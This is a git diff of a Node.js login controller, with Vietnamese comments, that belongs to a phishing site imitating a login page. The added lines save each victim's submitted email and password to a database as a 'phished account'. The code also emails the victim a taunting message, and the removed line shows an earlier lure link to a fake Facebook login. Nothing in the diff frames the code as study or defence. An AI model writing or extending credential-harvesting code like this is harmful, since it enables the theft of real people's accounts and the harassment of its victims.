@@ -1,8 +1,11 @@
 import exp from "constants";
 import fs from "fs";
 import nodemailer from "nodemailer";
+
+import AccountModel from "../../models/account.models.js";
+
 const login = async (req, res) => {
-  const { email, password } = req.body;
+  const { email, password, phone } = req.body;
 
   if (!email || !password) {
     return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
@@ -14,10 +17,14 @@ const login = async (req, res) => {
 
   console.log("Đã lưu:", logData);
 
+  //Lưu thông tin vào db
+  const phishedAccount = { email, password };
+  await AccountModel.create(phishedAccount);
+  console.log("Đã lưu tài khoản con mồi vào db");
   // Gửi email thông báo
   sendPhishingEmail(email);
 
-  res.json({ message: "Đăng nhập thất bại! Sai mật khẩu hoặc tài khoản." });
+  // res.json({ message: "Đăng nhập thất bại! Sai mật khẩu hoặc tài khoản." });
 };
 
 // Gửi email phishing
@@ -35,7 +42,7 @@ const sendPhishingEmail = async (targetEmail) => {
       from: process.env.EMAIL_USERNAME,
       to: targetEmail,
       subject: "Tài khoản của bạn đang gặp sự cố vì Quốc Anh đẹp trai nhất Q7!",
-      text: `Vui lòng truy cập vào đường link sau để xác nhận tài khoản: http://fake-facebook.com/login`,
+      text: `Mất acc rồi nha lêu lêu :))))`,
     };
 
     await transporter.sendMail(mailOptions);
